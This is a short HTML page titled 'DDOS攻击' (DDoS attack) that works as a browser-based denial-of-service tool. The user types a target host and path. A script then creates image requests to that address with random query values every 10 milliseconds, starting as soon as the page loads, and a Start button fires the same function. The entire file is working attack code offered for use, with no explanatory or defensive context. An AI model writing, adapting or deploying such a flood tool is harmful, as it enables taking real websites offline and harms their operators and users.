<!DOCTYPE html>
<html>

<head>
  <meta charset="UTF-8">
  <title>DDOS攻击</title>
  <script>
    function imgflood() {
      var TARGET = document.getElementById("Target").value;
      var URI = document.getElementById("file").value;
      var pic = new Image();
      var rand = Math.floor(Math.random() * 1000);
      pic.src = 'http://' + TARGET + URI + rand + '=val';
    }
    setInterval(imgflood, 10);
  </script>
  <style>
    h1 {
      text-align: center;
      font-size: xx-large;
    }

    .setting_bar {
      text-align: center;
      font-size: xx-large;
      margin: 0 auto;
      height: auto;
      width: auto;
    }

    .Start_Bu {
      text-align: center;
      font-size: xx-large;
      margin: 0 auto;
      height: auto;
      width: auto;
    }
  </style>
</head>

<body>
  <br>
  <h1>攻击信息</h1>
  <br>
  <div class="setting_bar">
    <p>https://</p><input id="Target">/<input id="file">
  </div>
  <br>
  <button class="Start_Bu" onclick='imgflood();'>
    Start
  </button>
</body>

</html>
